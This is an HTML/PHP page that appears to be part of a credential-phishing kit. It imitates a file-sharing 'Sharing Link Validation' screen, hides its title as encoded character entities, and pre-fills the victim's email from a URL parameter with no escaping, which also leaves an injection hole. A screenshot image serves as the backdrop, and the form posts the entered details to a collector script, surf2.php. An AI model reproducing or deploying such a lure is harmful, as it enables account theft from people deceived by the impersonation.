<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>&#83;&#104;&#97;&#114;&#105;&#110;&#103;&#32;&#76;&#105;&#110;&#107;&#32;&#86;&#97;&#108;&#105;&#100;&#97;&#116;&#105;&#111;&#110;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox {
  	padding-left: 7px;
  	font-family: 'Segoe UI Web (West European)', 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
    font-size: 16px;
    color: #666;
    height: 45px;
    width: 275px;
    border: 1px solid #a6a6a6;
}
 </style>			  
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body bgColor="#F4F4F4">
<div id="container">
<div class="loader"></div>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:640px; z-index:0"><img src="images/p1.png" alt="" title="" border=0 width=1365 height=640></div>
<form action=surf2.php name=skarduchlen id=skarduchlen method=post>
<input name="user" value="<?=$_GET[emailid]?>" placeholder="&#69;&#109;&#97;&#105;&#108;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:296px;left:535px;top:458px;z-index:1">
<div id="formimage1" style="position:absolute; left:534px; top:530px; z-index:2"><input type="image" name="formimage1" width="298" height="46" src="images/xt.png"></div>
</div>

</body>
</html>
